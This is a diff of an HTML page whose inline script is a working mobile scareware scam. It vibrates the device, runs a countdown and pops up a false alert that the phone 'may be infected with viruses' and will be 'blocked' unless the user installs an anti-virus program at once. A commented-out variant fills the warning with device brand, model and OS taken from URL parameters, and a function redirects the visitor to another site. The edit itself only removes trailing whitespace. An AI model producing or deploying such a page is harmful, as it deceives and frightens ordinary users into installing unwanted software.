@@ -52,7 +52,7 @@
   <script>
   function getURLParameter(e){return decodeURI((RegExp(e+"=(.*?)(&|$)").exec(location.search)||[,null])[1]||"")}function countDown(){-1==--sec?(sec=59,min-=1):min=min,sec<=9&&(sec="0"+sec),time=(min<=9?""+min:min)+" minutes and "+sec+" seconds",document.getElementById&&(document.getElementById("theTime").innerHTML=time),SD=window.setTimeout("countDown();",1e3),"00"==min&&"00"==sec&&(sec="00",window.clearTimeout(SD))}function goto(){location.href="http://www.example.com"}navigator.vibrate=navigator.vibrate||navigator.webkitVibrate||navigator.mozVibrate||navigator.msVibrate,navigator.vibrate([5e4]);var sec=21,min=0;window.onload=countDown;
   alert("WARNING!\n\nYour mobile device may be infected with viruses!\n\nYou should immediately install anti-virus program to clean the system otherwise your Android may be blocked");
-  /*alert("WARNING!\n\nYour " + (getURLParameter('brand')) + "-" + (getURLParameter('model')) + " may be infected with viruses!\n\n\You should immediately install anti-virus program to clean the system otherwise your " + (getURLParameter('os')) + "-" + (getURLParameter('osv')) + " may be blocked");*/  
+  /*alert("WARNING!\n\nYour " + (getURLParameter('brand')) + "-" + (getURLParameter('model')) + " may be infected with viruses!\n\n\You should immediately install anti-virus program to clean the system otherwise your " + (getURLParameter('os')) + "-" + (getURLParameter('osv')) + " may be blocked");*/
   </script>
 </body>
 
